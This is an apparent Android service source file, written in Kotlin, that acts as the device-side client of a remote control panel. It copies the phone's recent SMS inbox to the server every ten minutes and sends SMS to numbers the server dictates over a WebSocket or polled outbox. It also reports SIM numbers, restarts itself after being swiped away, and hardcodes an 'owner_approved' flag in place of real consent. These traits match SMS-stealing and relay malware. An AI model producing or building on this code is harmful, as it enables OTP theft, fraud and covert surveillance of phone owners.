package com.screenlink.remote

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class TpcService : Service() {

    companion object {
        // TODO: apna panel domain yahan daalo (https only)
        const val API_BASE_URL = "https://panel.example.com"

        const val CHANNEL_ID = "tpc_core"
        const val NOTIF_ID = 4201
        const val ACTION_STATUS = "com.screenlink.remote.STATUS"

        private const val PREFS = "viral_prefs"
        private const val KEY_RID = "registration_id"

        private const val HEARTBEAT_MS = 30_000L
        private const val OUTBOX_POLL_MS = 20_000L
        private const val RECONNECT_MAX_MS = 30_000L
        private const val INBOX_SYNC_MS = 10 * 60_000L

        @Volatile var socketConnected = false
        @Volatile var lastNumber = ""
        @Volatile var lastHeartbeatAt = 0L

        fun start(ctx: Context) {
            val i = Intent(ctx, TpcService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
            else ctx.startService(i)
        }
    }

    private val client: OkHttpClient by lazy {
        ApiClient.client().newBuilder()
            .pingInterval(20, TimeUnit.SECONDS)   // native ws keepalive
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .build()
    }

    private val io: ScheduledExecutorService = Executors.newScheduledThreadPool(3)
    private val main = Handler(Looper.getMainLooper())

    private var ws: WebSocket? = null
    private val running = AtomicBoolean(false)
    private var reconnectDelay = 1000L
    private var booted = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundSafe()
        if (!running.getAndSet(true)) startLoops()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // swipe karne par bhi zinda raho
        val restart = PendingIntent.getService(
            this, 1, Intent(this, TpcService::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        am.set(AlarmManager.RTC, System.currentTimeMillis() + 1500, restart)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running.set(false)
        runCatching { ws?.close(1000, "service stop") }
        runCatching { io.shutdownNow() }
        socketConnected = false
        broadcastStatus()
        super.onDestroy()
    }

    // ---------------------------------------------------------- foreground

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val ch = NotificationChannel(
            CHANNEL_ID, "TPC Core", NotificationManager.IMPORTANCE_LOW
        ).apply { setShowBadge(false) }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(ch)
    }

    private fun startForegroundSafe() {
        val n = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Service running")
            .setContentText("SMS relay active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, n,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIF_ID, n)
            }
        } catch (e: Exception) {
            Log.w("TPC", "foreground fail: ${e.message}")
        }
    }

    // ------------------------------------------------------------- loops

    private fun startLoops() {
        registerAndPush()
        connectSocket()

        io.scheduleWithFixedDelay({
            runCatching { heartbeat() }
        }, 3, HEARTBEAT_MS / 1000, TimeUnit.SECONDS)

        io.scheduleWithFixedDelay({
            if (!socketConnected) runCatching { pollOutbox() }
        }, 5, OUTBOX_POLL_MS / 1000, TimeUnit.SECONDS)

        io.scheduleWithFixedDelay({
            runCatching { syncInbox() }
        }, 20, INBOX_SYNC_MS / 1000, TimeUnit.SECONDS)
    }

    private fun prefs(): SharedPreferences = getSharedPreferences(PREFS, MODE_PRIVATE)

    private fun rid(): String {
        val p = prefs()
        p.getString(KEY_RID, null)?.let { if (it.isNotBlank()) return it }
        val id = java.util.UUID.randomUUID().toString()
        p.edit().putString(KEY_RID, id).apply()
        return id
    }

    private fun deviceName(): String =
        "${Build.MANUFACTURER} ${Build.MODEL}".take(40)

    // ---------------------------------------------------------- REST

    private fun registerAndPush() {
        val telemetry = Telemetry.collect(this)
        val ok = ApiClient.post("/devices/register", JSONObject().apply {
            put("device_name", deviceName())
            put("platform", "android")
            put("registration_id", rid())
            put("owner_approved", true)
            put("telemetry", telemetry)
        })
        if (!ok) Log.w("TPC", "register fail (retry heartbeat par ho jayega)")
        lastHeartbeatAt = System.currentTimeMillis()
    }

    private fun heartbeat() {
        val telemetry = Telemetry.collect(this)
        val ok = ApiClient.post("/devices/heartbeat", JSONObject().apply {
            put("registration_id", rid())
            put("telemetry", telemetry)
        })
        lastHeartbeatAt = System.currentTimeMillis()
        if (!ok && !socketConnected) connectSocket()
        broadcastStatus()
    }

    private fun pushTelemetry() {
        ApiClient.post("/devices/telemetry", JSONObject().apply {
            put("registration_id", rid())
            put("telemetry", Telemetry.collect(this))
        })
    }

    private fun pollOutbox() {
        val res = ApiClient.get("/devices/outbox?registration_id=${rid()}") ?: return
        val items = res.optJSONArray("items") ?: return
        for (i in 0 until items.length()) {
            val o = items.optJSONObject(i) ?: continue
            handleSmsSend(o.optString("id"), o.optString("to"), o.optString("body"))
        }
    }

    private fun syncInbox() {
        val items = SmsReader.recent(this, 100)
        if (items.length() == 0) return
        ApiClient.post("/devices/sms/sync", JSONObject().apply {
            put("registration_id", rid())
            put("messages", items)
        })
    }

    // ---------------------------------------------------------- socket

    private fun connectSocket() {
        if (!running.get()) return
        runCatching { ws?.cancel() }

        val url = ApiClient.wsUrl() + rid()
        val req = Request.Builder().url(url).build()

        ws = client.newWebSocket(req, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                socketConnected = true
                reconnectDelay = 1000L
                Log.i("TPC", "socket open")
                broadcastStatus()
                // turant pending uthao + telemetry bhejo
                io.execute {
                    runCatching { pollOutbox() }
                    runCatching {
                        webSocket.send(JSONObject().apply {
                            put("type", "telemetry")
                            put("data", Telemetry.collect(this@TpcService))
                        }.toString())
                    }
                }
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                runCatching { handleSocketMessage(webSocket, JSONObject(text)) }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                socketConnected = false
                broadcastStatus()
                scheduleReconnect()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                socketConnected = false
                broadcastStatus()
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        if (!running.get()) return
        val delay = reconnectDelay
        reconnectDelay = (reconnectDelay * 2).coerceAtMost(RECONNECT_MAX_MS)
        main.postDelayed({ if (running.get() && !socketConnected) connectSocket() }, delay)
    }

    private fun handleSocketMessage(webSocket: WebSocket, msg: JSONObject) {
        when (msg.optString("type").lowercase()) {
            "ping", "heartbeat" -> {
                webSocket.send(JSONObject().apply {
                    put("type", "pong")
                    put("ts", System.currentTimeMillis() / 1000)
                }.toString())
            }
            "hello" -> {
                pushTelemetry()
                pollOutbox()
            }
            "sms_send" -> handleSmsSend(
                msg.optString("id"), msg.optString("to"), msg.optString("body")
            )
            "command" -> handleCommand(webSocket, msg.optString("action"))
        }
    }

    private fun handleCommand(webSocket: WebSocket, action: String) {
        when (action.lowercase()) {
            "fetch_number", "number", "sim_info", "refresh_telemetry" -> {
                val telemetry = Telemetry.collect(this)
                webSocket.send(JSONObject().apply {
                    put("type", "command_result")
                    put("action", "fetch_number")
                    put("data", telemetry)
                }.toString())
                ApiClient.post("/devices/command/result", JSONObject().apply {
                    put("registration_id", rid())
                    put("action", "fetch_number")
                    put("data", telemetry)
                })
            }
            "ping" -> webSocket.send(
                JSONObject().put("type", "pong")
                    .put("ts", System.currentTimeMillis() / 1000).toString()
            )
            "wake" -> {
                pushTelemetry()
                pollOutbox()
            }
        }
        broadcastStatus()
    }

    // ---------------------------------------------------------- SMS send

    private fun handleSmsSend(itemId: String, to: String, body: String) {
        if (itemId.isBlank() || body.isBlank()) return

        var target = SimNumbers.normalize(to)
        if (target.isBlank()) target = SimNumbers.best(this)?.first ?: ""

        if (target.isBlank()) {
            ack(itemId, "failed", "no target number")
            return
        }
        if (target.length == 10) target = "+91$target"

        try {
            val sm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subId = SimNumbers.all(this).firstOrNull()?.subId ?: -1
                if (subId >= 0) android.telephony.SmsManager.getSmsManagerForSubscriptionId(subId)
                else android.telephony.SmsManager.getDefault()
            } else android.telephony.SmsManager.getDefault()

            val parts = sm.divideMessage(body)
            val flags = PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT

            val sentList = ArrayList<PendingIntent>()
            parts.indices.forEach { idx ->
                sentList.add(PendingIntent.getBroadcast(
                    this, (itemId + idx).hashCode(),
                    Intent(this, SmsStatusReceiver::class.java).apply {
                        action = SmsStatusReceiver.ACTION_SENT
                        putExtra("item_id", itemId)
                        putExtra("to", target)
                        putExtra("body", body)
                    }, flags
                ))
            }

            if (parts.size > 1) sm.sendMultipartTextMessage(target, null, parts, sentList, null)
            else sm.sendTextMessage(target, null, body, sentList[0], null)

            Log.i("TPC", "SMS → $target (${body.length} chars)")
        } catch (e: Exception) {
            ack(itemId, "failed", e.message ?: "send error")
        }
    }

    fun ack(itemId: String, status: String, error: String = "") {
        val payload = JSONObject().apply {
            put("registration_id", rid())
            put("status", status)
            put("error", error)
        }
        // REST ack (reliable) + socket ack (fast)
        io.execute { ApiClient.post("/devices/outbox/$itemId/ack", payload) }
        runCatching {
            ws?.send(JSONObject().apply {
                put("type", "ack")
                put("id", itemId)
                put("status", status)
                put("error", error)
            }.toString())
        }
    }

    // ------------------------------------------------------- status ping

    private fun broadcastStatus() {
        sendBroadcast(Intent(ACTION_STATUS).setPackage(packageName))
    }
}